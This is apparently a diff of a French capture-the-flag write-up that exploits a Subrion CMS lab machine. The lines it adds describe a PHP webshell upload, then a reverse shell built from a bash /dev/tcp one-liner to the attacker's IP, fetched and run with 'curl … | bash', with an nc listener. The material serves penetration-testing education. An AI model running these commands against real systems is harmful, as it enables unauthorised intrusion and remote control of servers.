@@ -28,7 +28,7 @@ La recherche par gobuster nous donne deux pages plutôt intéressantes: `http://
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746658876068/6bec499c-551a-496d-8d06-7cf1a7998a57.png align="center")
 
-La page `http://10.10.74.44/test/` semble être une page malveillante
+La page `http://10.10.74.44/test/` semble être une page malveillante avec beaucoup de pop-ups.
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746658860501/e7efa3d5-8dbe-48f2-8e6d-924ef1d7127d.png align="center")
 
@@ -98,16 +98,46 @@ On se rend dans `msfconsole` ensuite, pour récupérer et adapter l’exploit av
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746666647564/fc52efa6-d180-47a8-b9ed-ac8d2b40a3ec.png align="center")
 
-Le fichier est maintenant téléchargé. La prochaine étape est d’y apporter quelques modifications
+Le fichier est maintenant téléchargé. La prochaine étape est de le consulter et voir ce que fait le contenu.
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746666738937/a2e81b6d-080e-46b7-bfa4-1a012b67984b.png align="center")
-
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746667846624/8bf99dc3-492d-469d-9fa1-f92a280fec4b.png align="center")
-
-Remplacez l’adresse IP au niveau de Origin, par l’adresse IP de votre machine et l’adresse IP au niveau de Referer par celle de votre machine cible.
-
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746668055416/dd41ce6e-1cdf-40e0-a2b0-49fec925a9b8.png align="center")
 
 Le script utilise `optparse` pour gérer les arguments. On peut donc ajouter les trois options `-u` pour l’URL cible, `-l` pour le nom d’utilisateur et `-p` pour le mot de passe.
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746667078187/78cfc61a-03da-44db-9e8d-4399a03bba73.png align="center")
+
+Après avoir lancé l’exploit avec les bon paramètres, on est maintenant connecté sur la machine avec `www-data`.
+
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746708238843/c4b8f267-2b18-4282-85da-245232b85736.png align="center")
+
+On voit bien que l’exploit a uploadé un webshell à l’adresse `http://10.10.123.58/subrion/panel/uploads/lpfotmxhylzwuss.phar`.
+
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746708586982/4d34069b-aa48-459c-9629-23fc4c0db706.png align="center")
+
+Ce webshell (lpfotmxhylzwuss.phar) permet d’exécuter des commandes à distance via des requêtes HTTP, en PHP ici.
+
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746708778813/e1246df7-40be-465f-9f62-f096879231c0.png align="center")
+
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746711106011/6aef2822-d97a-44a5-b347-c8fe6c728dc4.png align="center")
+
+L’exploit `49876.py` ici permet d’exécuter des commandes sur le serveur , mais il est limité au répertoire `/var/www/html/subrion/uploads`. Même lorsqu’on fait cd /, on se trouve toujours dans le répertoire `/var/www/html/subrion/uploads`.
+
+Le webshell `lpfotmxhylzwuss.phar` est limité, on a pas de changement de répertoire. Il faut donc trouver un moyen d’avoir un shell interactif.
+
+On va donc tenter d’obtenir un reverse shell, en y envoyant un payload qui se connecte à notre machine.
+
+```bash
+nano revshell.sh
+#!/bin/bash
+/bin/bash -i >& /dev/tcp/10.10.12.49/4444 0>&1
+```
+
+Ce code va créer un reverse shell vers notre machine. La prochaine étape serait de lancer un écouteur sur notre machine avec la commande `nc -lvnp 4444` puis récupérer le fichier `revshell.sh` depuis le serveur subrion. La commande bash exécute le script téléchargé.
+
+```bash
+curl 10.10.12.49:8000/revshell.sh | bash
+```
+
+On a donc réussi à avoir le shell.
+
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746710367088/77189810-6950-489b-8dff-8dd943b040c2.png align="center")
